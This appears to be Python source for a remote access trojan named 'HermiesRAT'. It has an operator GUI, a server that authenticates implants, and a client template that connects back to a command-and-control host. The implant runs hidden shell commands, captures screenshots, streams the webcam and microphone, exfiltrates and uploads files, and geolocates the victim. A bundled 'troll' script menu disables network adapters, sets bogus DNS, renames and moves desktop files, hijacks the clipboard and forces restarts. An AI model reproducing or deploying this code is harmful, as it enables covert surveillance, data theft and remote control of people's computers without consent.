        ("taskbar left",      "powershell",
         "$b=[byte[]](0x30,0,0,0,0xFE,0xFF,0xFF,0xFF,0x00,0,0,0,0x03,0,0,0,"
         "0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,"
         "0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0);"
         "Set-ItemProperty"
         " 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StuckRects3'"
         " -Name Settings -Value $b"),
        ("small icons",       "powershell",
         "Set-ItemProperty"
         " 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced'"
         " -Name TaskbarSmallIcons -Value '1'"),
        ("normal icons",      "powershell",
         "Set-ItemProperty"
         " 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced'"
         " -Name TaskbarSmallIcons -Value '0'"),
        ("show seconds",      "powershell",
         "Set-ItemProperty"
         " 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced'"
         " -Name ShowSecondsInSystemClock -Value '1'"),
        ("hide seconds",      "powershell",
         "Set-ItemProperty"
         " 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced'"
         " -Name ShowSecondsInSystemClock -Value '0'"),
        ("rename recycle bin","powershell",
         "$k='HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CLSID"
         "\\{645FF040-5081-101B-9F08-00AA002F954E}';"
         "New-Item $k -Force|Out-Null;"
         "Set-ItemProperty $k -Name '(default)' -Value 'Trash'"),
        ("restore bin name",  "powershell",
         "Remove-ItemProperty"
         " 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CLSID"
         "\\{645FF040-5081-101B-9F08-00AA002F954E}'"
         " -Name '(default)' -EA SilentlyContinue"),
        ("rename This PC",    "powershell",
         "$k='HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CLSID"
         "\\{20D04FE0-3AEA-1069-A2D8-08002B30309D}';"
         "New-Item $k -Force|Out-Null;"
         "Set-ItemProperty $k -Name '(default)' -Value 'My Little Computer'"),
        ("restore PC name",   "powershell",
         "Remove-ItemProperty"
         " 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CLSID"
         "\\{20D04FE0-3AEA-1069-A2D8-08002B30309D}'"
         " -Name '(default)' -EA SilentlyContinue"),
        ("kill explorer",     "powershell",
         "Stop-Process -Name explorer -Force"),
        ("start explorer",    "powershell",
         "Start-Process explorer.exe"),
    ],

    "📁  Files / Desktop": [
        ("50 desktop files",  "powershell",
         "1..50|%{New-Item \"$env:USERPROFILE\\Desktop\\file$_.txt\" -Force|Out-Null}"),
        ("1000 junk files",   "powershell",
         "$d=\"$env:USERPROFILE\\Desktop\\junk\";"
         "New-Item $d -ItemType Directory -Force|Out-Null;"
         "1..1000|%{New-Item \"$d\\f$_.txt\" -Force|Out-Null}"),
        ("rename all desktop","powershell",
         "$n=0;Get-ChildItem \"$env:USERPROFILE\\Desktop\" -File"
         "|%{$n++;Rename-Item $_.FullName \"troll_$n$($_.Extension)\" -EA SilentlyContinue}"),
        ("move desktop to junk","powershell",
         "$d=\"$env:USERPROFILE\\Desktop\\junk\";"
         "New-Item $d -ItemType Directory -Force|Out-Null;"
         "Get-ChildItem \"$env:USERPROFILE\\Desktop\" -File|Move-Item -Destination $d"),
        ("rickroll shortcut", "powershell",
         "$s=(New-Object -ComObject WScript.Shell).CreateShortcut("
         "\"$env:USERPROFILE\\Desktop\\YouTube.lnk\");"
         "$s.TargetPath='https://www.youtube.com/watch?v=dQw4w9WgXcQ';$s.Save()"),
        ("troll right-click", "powershell",
         "New-Item -Path 'HKCU:\\Software\\Classes\\*\\shell\\Troll' -Force|Out-Null;"
         "Set-ItemProperty 'HKCU:\\Software\\Classes\\*\\shell\\Troll'"
         " -Name '(default)' -Value 'Troll';"
         "Set-ItemProperty 'HKCU:\\Software\\Classes\\*\\shell\\Troll'"
         " -Name Icon -Value 'C:\\Windows\\System32\\shell32.dll,1'"),
        ("remove troll click","powershell",
         "Remove-Item -Path 'HKCU:\\Software\\Classes\\*\\shell\\Troll'"
         " -Recurse -Force -EA SilentlyContinue"),
        ("empty recycle bin", "powershell",
         "Clear-RecycleBin -Force"),
    ],

    "📋  Clipboard": [
        ("set 'troll'",       "powershell", "Set-Clipboard 'troll'"),
        ("set 'hunter2'",     "powershell", "Set-Clipboard 'hunter2'"),
        ("set rickroll url",  "powershell",
         "Set-Clipboard 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'"),
        ("set time loop",     "powershell",
         "while($true){Set-Clipboard (Get-Date).ToString();Start-Sleep 5}"),
        ("clear loop",        "powershell",
         "while($true){Set-Clipboard '';Start-Sleep 2}"),
        ("read clipboard",    "powershell",
         "(New-Object -ComObject SAPI.SpVoice).Speak([string](Get-Clipboard))"),
    ],

    "🌐  Network": [
        ("disable Wi-Fi",     "powershell",
         "Disable-NetAdapter -Name 'Wi-Fi' -Confirm:$false -EA SilentlyContinue"),
        ("enable Wi-Fi",      "powershell",
         "Enable-NetAdapter -Name 'Wi-Fi' -Confirm:$false -EA SilentlyContinue"),
        ("disable Ethernet",  "powershell",
         "Disable-NetAdapter -Name 'Ethernet' -Confirm:$false -EA SilentlyContinue"),
        ("enable Ethernet",   "powershell",
         "Enable-NetAdapter -Name 'Ethernet' -Confirm:$false -EA SilentlyContinue"),
        ("disable all adapters","powershell",
         "Get-NetAdapter|Disable-NetAdapter -Confirm:$false -EA SilentlyContinue"),
        ("set bad DNS",       "powershell",
         "Set-DnsClientServerAddress -InterfaceAlias 'Wi-Fi'"
         " -ServerAddresses '192.0.2.1' -EA SilentlyContinue"),
        ("restore DNS",       "powershell",
         "Set-DnsClientServerAddress -InterfaceAlias 'Wi-Fi'"
         " -ServerAddresses '8.8.8.8' -EA SilentlyContinue"),
        ("flush DNS",         "cmd",
         "ipconfig /flushdns"),
        ("ping loop",         "powershell",
         "while($true){ping -n 1 127.0.0.1|Out-Null;Start-Sleep -Milliseconds 100}"),
    ],

    "⚙  System": [
        ("eject cd",          "powershell",
         "(New-Object -ComObject Shell.Application).NameSpace(17).Items()|"
         "?{$_.Type -eq 'CD Drive'}|%{$_.InvokeVerb('E&ject')}"),
        ("lock workstation",  "cmd",
         "rundll32 user32.dll,LockWorkStation"),
        ("sleep",             "powershell",
         "rundll32.exe powrprof.dll,SetSuspendState 0,1,0"),
        ("hibernate",         "cmd",
         "shutdown /h"),
        ("restart",           "cmd",
         "shutdown /r /t 0"),
    ],

    "🐧  Linux": [
        ("[L] wall msg",      "bash",
         "wall 'Your system has been compromised."
         " Please contact your sysadmin immediately.' 2>/dev/null"),
        ("[L] spam notify",   "bash",
         "for i in $(seq 1 20); do "
         "notify-send 'ALERT' 'You have been hacked. Have a nice day.' 2>/dev/null;"
         " sleep 0.3; done"),
        ("[L] eject cdrom",   "bash",
         "eject 2>/dev/null; eject /dev/cdrom 2>/dev/null; eject /dev/sr0 2>/dev/null"),
        ("[L] term flash",    "bash",
         "for i in $(seq 1 30); do echo -e '\\e[?5h'; sleep 0.1;"
         " echo -e '\\e[?5l'; sleep 0.1; done"),
        ("[L] spam beep",     "bash",
         "for i in $(seq 1 20); do echo -ne '\\a'; sleep 0.2; done"),
        ("[L] fake rm -rf",   "bash",
         "echo 'rm: it is dangerous to operate recursively on \"/\"'; "
         "echo 'rm: use --no-preserve-root to override this failsafe'; sleep 2; "
         "echo '[sudo] removing system files...'; sleep 1; echo 'just kidding lol'"),
        ("[L] rev /etc/motd", "bash",
         "cat /etc/motd 2>/dev/null | rev | tee /tmp/.motd_bak; "
         "sudo tee /etc/motd < /tmp/.motd_bak 2>/dev/null"),
        ("[L] alias ls=rev",  "bash",
         "echo \"alias ls='ls --color=always | rev'\""
         " >> ~/.bashrc && source ~/.bashrc 2>/dev/null"),
        ("[L] yes spam",      "bash",
         "timeout 5 yes 'ALL YOUR BASE ARE BELONG TO US' &"),
        ("[L] fork bomb safe","bash",
         "timeout 5 bash -c 'while true; do sleep 0.01; done &' 2>/dev/null"),
    ],
}


#  [AUTH]
def _verify_client(conn, secret):
    try:
        conn.settimeout(AUTH_TIMEOUT)
        nonce = secrets.token_bytes(32)
        conn.sendall(nonce.hex().encode() + b"\n")
        resp = b""
        while b"\n" not in resp:
            chunk = conn.recv(128)
            if not chunk:
                return False
            resp += chunk
        client_mac = base64.b64decode(resp.strip())
        expected   = hmac.new(secret, nonce, hashlib.sha256).digest()
        if hmac.compare_digest(client_mac, expected):
            conn.settimeout(None)
            return True
        return False
    except Exception:
        return False


#  [MESSAGING] 
def send_msg(sock, cmd, data=None):
    payload = json.dumps({"cmd": cmd, "data": data}).encode()
    sock.sendall(struct.pack(">I", len(payload)) + payload)

def recv_msg(sock):
    raw = _recvall(sock, 4)
    if not raw:
        return None
    length = struct.unpack(">I", raw)[0]
    if length == 0:
        return None
    raw = _recvall(sock, length)
    if not raw:
        return None
    try:
        return json.loads(raw.decode())
    except Exception:
        return None

def _recvall(sock, n):
    buf = b""
    while len(buf) < n:
        try:
            chunk = sock.recv(n - len(buf))
        except Exception:
            return None
        if not chunk:
            return None
        buf += chunk
    return buf


#  [SERVER STATE]
clients           = {}
client_id_counter = 0
_lock             = threading.Lock()
_active_secret    = SHARED_SECRET
_map_geo_cache    = {}   # ip -> {lat, lon, city, country, org}


#  [SERVER]
def accept_loop(server_sock, gui):
    global client_id_counter
    while True:
        try:
            conn, addr = server_sock.accept()
        except Exception:
            break
        threading.Thread(target=_auth_and_register,
                         args=(conn, addr, gui), daemon=True).start()

def _auth_and_register(conn, addr, gui):
    global client_id_counter
    if not _verify_client(conn, _active_secret):
        gui.log(f"[-] auth failed  {addr[0]}:{addr[1]}")
        try: conn.close()
        except Exception: pass
        return
    try:
        msg  = recv_msg(conn)
        info = msg.get("data", {}) if msg and msg.get("cmd") == "sysinfo" else {}
    except Exception:
        info = {}
    user   = info.get("user", "")
    os_str = info.get("os", "")
    with _lock:
        cid = client_id_counter
        client_id_counter += 1
        clients[cid] = {
            "sock":  conn,
            "addr":  addr,
            "label": f"{addr[0]}:{addr[1]}",
            "lock":  threading.Lock(),
            "user":  user,
            "os":    os_str,
        }
    _db_upsert(addr[0], f"{addr[0]}:{addr[1]}", user, os_str)
    gui.log(f"[+] authenticated  {addr[0]}:{addr[1]}  id={cid}  {os_str}  {user}")
    gui.refresh_clients()


#  [CLIENT_TEMPLATE] 

CLIENT_TEMPLATE = '''\
import socket, subprocess, struct, json, base64, io, os, time, platform, threading, hmac, hashlib

_MODULES = {{}}
__MODULE_INJECT__

C2_HOST       = {c2_host!r}
C2_PORT       = {c2_port}
RETRY_DELAY   = {retry}
CLIENT_SECRET = {secret!r}

def _do_auth(sock):
    try:
        sock.settimeout(15)
        buf = b""
        while b"\\n" not in buf:
            chunk = sock.recv(128)
            if not chunk: return False
            buf += chunk
        nonce = bytes.fromhex(buf.strip().decode())
        mac   = hmac.new(CLIENT_SECRET, nonce, hashlib.sha256).digest()
        sock.sendall(base64.b64encode(mac) + b"\\n")
        sock.settimeout(None)
        return True
    except Exception:
        return False

def send_msg(sock, cmd, data=None):
    payload = json.dumps({{"cmd": cmd, "data": data}}).encode()
    sock.sendall(struct.pack(">I", len(payload)) + payload)

def recv_msg(sock):
    raw = _recvall(sock, 4)
    if not raw: return None
    raw = _recvall(sock, struct.unpack(">I", raw)[0])
    if not raw: return None
    try:
        return json.loads(raw.decode())
    except Exception:
        return None

def _recvall(sock, n):
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk: return None
        buf += chunk
    return buf

def handle_shell(payload):
    shell_type = payload.get("shell", "cmd")
    cmd        = payload.get("cmd", "")
    os_name    = platform.system()
    if shell_type == "cmd" and os_name == "Windows":
        args = ["cmd.exe", "/c", cmd]
    elif shell_type == "powershell" and os_name == "Windows":
        args = ["powershell.exe", "-NoProfile", "-NonInteractive", "-Command", cmd]
    elif shell_type == "bash":
        args = ["bash", "-c", cmd]
    else:
        args = cmd if os_name == "Windows" else ["/bin/sh", "-c", cmd]
    try:
        r = subprocess.run(args, capture_output=True, text=True, timeout=30,
                           creationflags=subprocess.CREATE_NO_WINDOW if os_name=="Windows" else 0)
        return (r.stdout + r.stderr) or "<no output>"
    except subprocess.TimeoutExpired: return "<timeout>"
    except FileNotFoundError as e:    return f"<shell not found: {{e}}>"
    except Exception as e:            return f"<error: {{e}}>"

def _ss_is_black(data):
    try:
        from PIL import Image as _I
        img = _I.open(io.BytesIO(data)).convert("L")
        raw = list(img.tobytes())
        return (sum(raw) / max(len(raw), 1)) < 3.0
    except Exception: return False

def _ss_load_tmp(tmp):
    try:
        with open(tmp, "rb") as fh: data = fh.read()
        os.unlink(tmp)
        return data or None
    except Exception: return None

def handle_screenshot():
    import tempfile
    errors = []
    def _run(cmd, stdin=None):
        try: return subprocess.run(cmd, capture_output=True, timeout=12, input=stdin)
        except FileNotFoundError: return None
        except Exception as e: errors.append(f"{{cmd[0]}}: {{e}}"); return None
    def _ok(r): return r is not None and r.returncode == 0
    def _wrap(data, method):
        if data and not _ss_is_black(data):
            return {{"data": base64.b64encode(data).decode(), "method": method}}
        if data: errors.append(f"{{method}}: black frame")
        return None
    with tempfile.TemporaryDirectory() as td:
        tmp = os.path.join(td, "ss.png")
        for tool, args in [
            ("grim",["grim",tmp]),("grimshot",["grimshot","save","screen",tmp]),
            ("wayshot",["wayshot","-f",tmp]),("spectacle",["spectacle","-b","-n","-o",tmp]),
            ("flameshot",["flameshot","full","-p",tmp]),("scrot",["scrot","-z",tmp]),
        ]:
            r = _run(args)
            if _ok(r) and os.path.exists(tmp):
                res = _wrap(_ss_load_tmp(tmp), tool)
                if res: return res
            elif r: errors.append(f"{{tool}}: rc={{r.returncode}}")
        try:
            import mss, glob as _g
            from PIL import Image as _Img
            def _xauth():
                for c in [os.environ.get("XAUTHORITY",""),
                           os.path.expanduser("~/.Xauthority")]:
                    if c and os.path.exists(c): return c
                uid = str(os.getuid()) if hasattr(os,"getuid") else ""
                for pat in [f"/run/user/{{uid}}/.mutter-Xwaylandauth.*",
                             f"/run/user/{{uid}}/xauth_*","/tmp/.xauth*"]:
                    m = _g.glob(pat)
                    if m: return m[0]
                return None
            xauth = _xauth()
            bd = os.environ.get("DISPLAY"); bx = os.environ.get("XAUTHORITY")
            os.environ["DISPLAY"] = ":0"
            if xauth: os.environ["XAUTHORITY"] = xauth
            try:
                with mss.MSS() as sct:
                    for mon in (sct.monitors[1:] or sct.monitors[:1]):
                        for _ in range(2): raw = sct.grab(mon)
                        img = _Img.frombytes("RGB", raw.size, raw.bgra, "raw", "BGRX")
                        buf = io.BytesIO(); img.save(buf, format="PNG")
                        res = _wrap(buf.getvalue(), "mss")
                        if res: return res
            finally:
                if bd is None: os.environ.pop("DISPLAY",None)
                else: os.environ["DISPLAY"] = bd
                if bx is None: os.environ.pop("XAUTHORITY",None)
                else: os.environ["XAUTHORITY"] = bx
        except Exception as e: errors.append(f"mss: {{e}}")
        try:
            from PIL import ImageGrab
            img = ImageGrab.grab(); buf = io.BytesIO(); img.save(buf, format="PNG")
            res = _wrap(buf.getvalue(), "PIL.ImageGrab")
            if res: return res
        except Exception as e: errors.append(f"PIL.ImageGrab: {{e}}")
    return {{"data": None, "errors": errors}}

def _list_v4l2():
    import glob
    devs = []
    for p in glob.glob("/dev/video*"):
        try: devs.append(int(p.replace("/dev/video","")))
        except ValueError: pass
    return sorted(devs)

def handle_camera(payload):
    try:
        import cv2
        idx = int(payload.get("index", 0))
        os_name = platform.system()
        backend = cv2.CAP_V4L2 if os_name == "Linux" else cv2.CAP_ANY
        def _open(i):
            c = cv2.VideoCapture(i, backend)
            if c.isOpened(): c.set(cv2.CAP_PROP_BUFFERSIZE, 1)
            return c
        cap = _open(idx)
        if not cap.isOpened():
            if os_name == "Linux":
                for fi in _list_v4l2():
                    cap = _open(fi)
                    if cap.isOpened(): break
            if not cap.isOpened(): return None
        deadline = time.time() + 3.0; frame = None
        while time.time() < deadline:
            ret, f = cap.read()
            if ret and f is not None and f.mean() > 2.0: frame = f; break
            time.sleep(0.05)
        cap.release()
        if frame is None: return None
        ok, buf = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 85])
        return base64.b64encode(buf.tobytes()).decode() if ok else None
    except Exception: return None

def handle_listdir(payload):
    path = payload.get("path", ".")
    try:
        entries = []
        for e in sorted(os.scandir(path), key=lambda x: (not x.is_dir(), x.name.lower())):
            entries.append({{
                "name": e.name,
                "is_dir": e.is_dir(),
                "size": e.stat().st_size if e.is_file() else 0,
                "path": e.path,
            }})
        return {{"ok": True, "path": path, "entries": entries}}
    except Exception as ex:
        return {{"ok": False, "path": path, "error": str(ex), "entries": []}}

def handle_download(payload):
    path = payload.get("path", "") if payload else ""
    if not path:
        return {{"ok": False, "error": "no path", "data": None}}
    try:
        with open(path, "rb") as fh:
            return {{"ok": True, "error": None, "data": base64.b64encode(fh.read()).decode()}}
    except Exception as e:
        return {{"ok": False, "error": str(e), "data": None}}

def handle_upload(payload):
    try:
        raw = base64.b64decode(payload.get("data",""))
        path = payload.get("path","")
        os.makedirs(os.path.dirname(os.path.abspath(path)), exist_ok=True)
        with open(path, "wb") as fh: fh.write(raw)
        return f"ok ({{len(raw)}} bytes)"
    except Exception as e: return f"error: {{e}}"

def handle_mic_record(payload):
    duration    = float((payload or {{}}).get("duration", 5))
    sample_rate = 16000
    channels    = 1
    os_name     = platform.system()
    err_py      = ""
    try:
        import pyaudio, wave
        CHUNK  = 1024
        FORMAT = pyaudio.paInt16
        p      = pyaudio.PyAudio()
        stream = p.open(format=FORMAT, channels=channels, rate=sample_rate,
                        input=True, frames_per_buffer=CHUNK)
        frames = []
        for _ in range(int(sample_rate / CHUNK * duration)):
            frames.append(stream.read(CHUNK, exception_on_overflow=False))
        stream.stop_stream(); stream.close(); p.terminate()
        buf = io.BytesIO()
        with wave.open(buf, 'wb') as wf:
            wf.setnchannels(channels)
            wf.setsampwidth(p.get_sample_size(FORMAT))
            wf.setframerate(sample_rate)
            wf.writeframes(b''.join(frames))
        return {{"ok": True, "data": base64.b64encode(buf.getvalue()).decode(), "method": "pyaudio"}}
    except Exception as e:
        err_py = str(e)
    if os_name == "Linux":
        try:
            import tempfile
            with tempfile.NamedTemporaryFile(suffix=".wav", delete=False) as tf:
                tmp = tf.name
            subprocess.run(
                ["arecord", "-d", str(int(duration)), "-r", str(sample_rate),
                 "-f", "S16_LE", "-c", str(channels), tmp],
                capture_output=True, timeout=duration + 5
            )
            with open(tmp, "rb") as fh:
                data = fh.read()
            os.unlink(tmp)
            if data:
                return {{"ok": True, "data": base64.b64encode(data).decode(), "method": "arecord"}}
        except Exception as e2:
            return {{"ok": False, "error": f"pyaudio: {{err_py}}  arecord: {{e2}}"}}
    if os_name == "Darwin":
        try:
            import tempfile
            with tempfile.NamedTemporaryFile(suffix=".wav", delete=False) as tf:
                tmp = tf.name
            subprocess.run(
                ["sox", "-d", "-r", str(sample_rate), "-c", str(channels), tmp,
                 "trim", "0", str(int(duration))],
                capture_output=True, timeout=duration + 5
            )
            with open(tmp, "rb") as fh:
                data = fh.read()
            os.unlink(tmp)
            if data:
                return {{"ok": True, "data": base64.b64encode(data).decode(), "method": "sox"}}
        except Exception as e3:
            return {{"ok": False, "error": f"pyaudio: {{err_py}}  sox: {{e3}}"}}
    if os_name == "Windows":
        try:
            import tempfile
            with tempfile.NamedTemporaryFile(suffix=".wav", delete=False) as tf:
                tmp = tf.name
            tmp_esc = tmp.replace("\\\\", "\\\\\\\\")
            ps = (
                '$c=@"\\nusing System;using System.Runtime.InteropServices;\\n'
                'public class Mci{[DllImport(\\"winmm.dll\\",CharSet=CharSet.Ansi)]'
                'public static extern int mciSendString(string s,System.Text.StringBuilder b,int l,IntPtr h);}\\n"@\\n'
                'Add-Type -TypeDefinition $c -EA SilentlyContinue;'
                '[Mci]::mciSendString("open new type waveaudio alias cap",$null,0,[IntPtr]::Zero)|Out-Null;'
                '[Mci]::mciSendString("set cap bitspersample 16 channels 1 samplespersec 16000 alignment 2",$null,0,[IntPtr]::Zero)|Out-Null;'
                '[Mci]::mciSendString("record cap",$null,0,[IntPtr]::Zero)|Out-Null;'
                'Start-Sleep -Seconds ' + str(int(duration)) + ';'
                '[Mci]::mciSendString("stop cap",$null,0,[IntPtr]::Zero)|Out-Null;'
                '[Mci]::mciSendString("save cap \\"' + tmp_esc + '\\",$null,0,[IntPtr]::Zero)|Out-Null;'
                '[Mci]::mciSendString("close cap",$null,0,[IntPtr]::Zero)|Out-Null'
            )
            subprocess.run(
                ["powershell.exe", "-NoProfile", "-NonInteractive", "-Command", ps],
                capture_output=True, timeout=duration + 20
            )
            with open(tmp, "rb") as fh:
                data = fh.read()
            try: os.unlink(tmp)
            except Exception: pass
            if data and len(data) > 44:
                return {{"ok": True, "data": base64.b64encode(data).decode(), "method": "mci/ps"}}
            return {{"ok": False, "error": "mci recorded 0 bytes (no mic or access denied)"}}
        except Exception as e3:
            return {{"ok": False, "error": f"pyaudio: {{err_py}}  mci/ps: {{e3}}"}}
    return {{"ok": False, "error": f"no mic backend available: {{err_py}}"}}

def handle_mic_stream(sock, data):
    import select as _sel
    duration    = float((data or {{}}).get("duration", 0))
    sample_rate = 16000
    channels    = 1
    CHUNK       = 2048
    try:
        import pyaudio
        FORMAT = pyaudio.paInt16
        p      = pyaudio.PyAudio()
        stream = p.open(format=FORMAT, channels=channels, rate=sample_rate,
                        input=True, frames_per_buffer=CHUNK)
        start = time.time()
        while True:
            r, _, _ = _sel.select([sock], [], [], 0)
            if r:
                sm = recv_msg(sock)
                if sm is None or sm.get("cmd") == "mic_stream_stop":
                    break
            if duration > 0 and (time.time() - start) >= duration:
                break
            try:
                chunk = stream.read(CHUNK, exception_on_overflow=False)
                send_msg(sock, "mic_chunk", base64.b64encode(chunk).decode())
            except Exception:
                break
        stream.stop_stream(); stream.close(); p.terminate()
    except Exception as e:
        send_msg(sock, "mic_chunk", None)
    finally:
        try:
            send_msg(sock, "mic_stream_ended", None)
        except Exception:
            pass

def handle_geolocate():
    try:
        import urllib.request
        with urllib.request.urlopen("https://ipinfo.io/json", timeout=6) as r:
            return json.loads(r.read().decode())
    except Exception as e1:
        pass
    try:
        r = subprocess.run(["curl", "-s", "--max-time", "6", "https://ipinfo.io/json"],
                           capture_output=True, text=True, timeout=10)
        return json.loads(r.stdout)
    except Exception as e2:
        return {{"error": f"urllib: could not connect  curl: {{e2}}"}}

def run():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((C2_HOST, C2_PORT))
            if not _do_auth(sock): sock.close(); time.sleep(RETRY_DELAY); continue
            dispatch(sock)
        except Exception: pass
        finally:
            try: sock.close()
            except Exception: pass
        time.sleep(RETRY_DELAY)

def get_sysinfo():
    return {{
        "user": os.environ.get("USERNAME") or os.environ.get("USER") or "unknown",
        "os":   platform.system() + " " + platform.release(),
    }}

def dispatch(sock):
    send_msg(sock, "sysinfo", get_sysinfo())
    while True:
        msg = recv_msg(sock)
        if msg is None: break
        cmd  = msg.get("cmd")
        data = msg.get("data")
        if   cmd == "exit": break
        elif cmd == "shell":
            send_msg(sock, "shell_resp", handle_shell(data))
        elif cmd == "screenshot":
            r = handle_screenshot()
            send_msg(sock, "screenshot_resp",
                     r if isinstance(r, dict) else {{"data": r, "method": "unknown"}})
        elif cmd == "camera":
            send_msg(sock, "camera_resp", handle_camera(data))
        elif cmd == "camera_stream":
            idx      = int((data or {{}}).get("index", 0))
            interval = float((data or {{}}).get("interval", 0.15))
            import cv2, select as _sel
            os_name = platform.system()
            backend = cv2.CAP_V4L2 if os_name == "Linux" else cv2.CAP_ANY
            def _open_cap(i):
                c = cv2.VideoCapture(i, backend)
                if c.isOpened(): c.set(cv2.CAP_PROP_BUFFERSIZE, 1)
                return c
            cap = _open_cap(idx)
            if not cap.isOpened() and os_name == "Linux":
                for fi in _list_v4l2():
                    cap = _open_cap(fi)
                    if cap.isOpened(): break
            if not cap.isOpened():
                send_msg(sock, "camera_resp", None)
            else:
                for _ in range(5): cap.read()
                try:
                    while True:
                        r2, _, _ = _sel.select([sock], [], [], 0)
                        if r2:
                            sm = recv_msg(sock)
                            if sm is None or sm.get("cmd") == "camera_stream_stop": break
                        ret, frame = cap.read()
                        if ret and frame is not None and frame.mean() > 2.0:
                            ok, buf = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 70])
                            if ok: send_msg(sock, "camera_resp",
                                            base64.b64encode(buf.tobytes()).decode())
                        time.sleep(interval)
                finally:
                    cap.release()
                    try: send_msg(sock, "camera_stream_ended", None)
                    except Exception: pass
        elif cmd == "listdir":
            send_msg(sock, "listdir_resp", handle_listdir(data))
        elif cmd == "run_module":
            mn = (data or {{}}).get("module",""); md = (data or {{}}).get("data",{{}})
            if mn in _MODULES:
                try:    send_msg(sock,"module_resp",{{"module":mn,"result":_MODULES[mn](md),"ok":True}})
                except Exception as e: send_msg(sock,"module_resp",{{"module":mn,"result":str(e),"ok":False}})
            else: send_msg(sock,"module_resp",{{"module":mn,"result":"not loaded","ok":False}})
        elif cmd == "list_modules":
            send_msg(sock, "module_list_resp", list(_MODULES.keys()))
        elif cmd == "download":
            send_msg(sock, "download_resp", handle_download(data))
        elif cmd == "upload":
            send_msg(sock, "upload_resp", handle_upload(data))
        elif cmd == "mic_record":
            send_msg(sock, "mic_resp", handle_mic_record(data))
        elif cmd == "mic_stream":
            handle_mic_stream(sock, data)
        elif cmd == "geolocate":
            send_msg(sock, "geo_resp", handle_geolocate())
        else:
            send_msg(sock, "unknown_cmd", f"unknown: {{cmd}}")

if __name__ == "__main__":
    run()
'''


#  [GUI] 
class HermiesGUI(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("HermiesRAT-Stable-1.aw")
        self.geometry("1200x760")
        self.resizable(True, True)

        self.selected_cid       = None
        self._srv_sock          = None
        self._cam_streaming     = False
        self._mic_streaming     = False
        self._mic_wav_data      = None
        self._ss_pil            = None
        self._ss_image          = None
        self._cam_pil           = None
        self._cam_image         = None
        self._cam_frame_times   = []
        self._b_mod_vars        = {}
        self._page              = 0
        self._PAGE_SIZE         = 10
        self._task_history      = []
        self._traffic_totals    = {"tx": 0, "rx": 0}
        self._traffic_per_cid   = {}
        self._dl_client_rows    = {}
        self._scripts_data      = {}
        self._script_sel        = None
        self._stars_photo       = None
        self._stars_label       = None
        self._custom_vars       = {}
        self._ssshare_running   = False
        self._ssshare_thread    = None
        self._ssshare_interval  = 0.5
        self._fb_cwd            = {}
        self._fb_entries        = []
        self._fb_sort_key       = "name"
        self._fb_sort_asc       = True

        self._apply_ttk_style()
        self.configure(bg=THEME["BG"])
        self._build()

    def _apply_ttk_style(self):
        T = THEME
        s = ttk.Style(self)
        s.theme_use("clam")
        cfg = {
            "TFrame":            {"background": T["BG"]},
            "TLabel":            {"background": T["BG"],  "foreground": T["FG"],    "font": FONT},
            "TButton":           {"background": T["BG3"], "foreground": T["FG"],    "font": FONT,
                                  "borderwidth": 1, "relief": "flat", "padding": (8, 4)},
            "Accent.TButton":    {"background": T["ACCENT"], "foreground": T["HDR_FG"],
                                  "font": FONT, "borderwidth": 0, "relief": "flat", "padding": (8, 4)},
            "TEntry":            {"fieldbackground": T["BG3"], "foreground": T["FG"],
                                  "insertcolor": T["ACCENT"], "font": FONT, "borderwidth": 1},
            "TLabelframe":       {"background": T["BG"],  "foreground": T["ACCENT"], "font": FONT,
                                  "borderwidth": 1, "relief": "flat"},
            "TLabelframe.Label": {"background": T["BG"],  "foreground": T["ACCENT"], "font": FONT},
            "Treeview":          {"background": T["BG2"], "foreground": T["FG"],
                                  "fieldbackground": T["BG2"], "font": FONT,
                                  "rowheight": 22, "borderwidth": 0},
            "Treeview.Heading":  {"background": T["BG3"], "foreground": T["ACCENT"],
                                  "font": FONT, "relief": "flat"},
            "TNotebook":         {"background": T["BG"],  "borderwidth": 0},
            "TNotebook.Tab":     {"background": T["BG3"], "foreground": T["FG_DIM"],
                                  "font": FONT, "padding": (12, 5)},
            "TRadiobutton":      {"background": T["BG"],  "foreground": T["FG"], "font": FONT},
            "TSeparator":        {"background": T["BG4"]},
            "TScrollbar":        {"background": T["BG3"], "troughcolor": T["BG"],
                                  "arrowcolor": T["ACCENT"]},
        }
        for name, opts in cfg.items():
            s.configure(name, **opts)
        s.map("TButton",        background=[("active", T["BG4"])],  foreground=[("active", T["ACCENT"])])
        s.map("Accent.TButton", background=[("active", T["ACCENT2"])])
        s.map("Treeview",       background=[("selected", T["BG4"])],foreground=[("selected", T["ACCENT"])])
        s.map("TNotebook.Tab",  background=[("selected", T["BG"])], foreground=[("selected", T["ACCENT"])])
        s.map("TEntry",         fieldbackground=[("focus", T["BG4"])])

    def _full_theme_rebuild(self):
        port = PORT
        if hasattr(self, "_listen_lbl"):
            txt = self._listen_lbl.cget("text")
            try:
                port = int(txt.split(":")[1])
            except Exception:
                pass
        self._apply_ttk_style()
        self.configure(bg=THEME["BG"])
        for w in self.winfo_children():
            w.destroy()
        self._stars_photo    = None
        self._stars_label    = None
        self._dl_client_rows = {}
        self._build()
        if hasattr(self, "_status_lbl"):
            self._status_lbl.configure(
                text="● listening" if self._srv_sock else "● stopped",
                fg=THEME["GREEN"] if self._srv_sock else THEME["FG_DIM"])

    def _apply_stars(self):
        if not THEME.get("STARS_BG"):
            if self._stars_label:
                self._stars_label.place_forget()
            return
        if not os.path.exists(STARS_PATH):
            self.log(f"[theme] stars.png not found: {STARS_PATH}")
            return
